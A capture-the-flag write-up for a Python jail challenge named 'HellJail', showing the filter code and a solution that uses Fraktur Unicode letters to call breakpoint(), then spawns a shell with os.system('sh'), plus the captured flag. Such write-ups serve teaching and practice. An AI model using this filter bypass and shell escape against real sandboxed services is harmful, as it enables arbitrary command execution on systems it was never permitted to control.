# HellJail
`-`

## About the Challenge
We have been given a source code like this

```python
#!/usr/bin/env python3

from string import ascii_letters

code = input('> ')

if any(c in ascii_letters for c in code):
    print('You will never leave this place!')
elif any(c in '.:;,-_@"=/%\\' for c in code):
    print('You will never reach this point, but still, you CANNOT leave!')
else:
    exec(code)
```

And we need to escape from the sandbox but we can input any ASCII letter and also some of the special character

![preview](images/preview.png)


## How to Solve?
To solve this problem, we need to convert our payload first to gothic font (Im using this [website](https://yaytext.com/fraktur/)) and here is the payload I used

```
𝔟𝔯𝔢𝔞𝔨𝔭𝔬𝔦𝔫𝔱()
```

And then after enterring Python debugging, i ran this command

```python
import os
os.system('sh')
```

![flag](images/flag.png)

```
DANTE{4b4nd0n_all_h0p3_y3_who_3nter}
```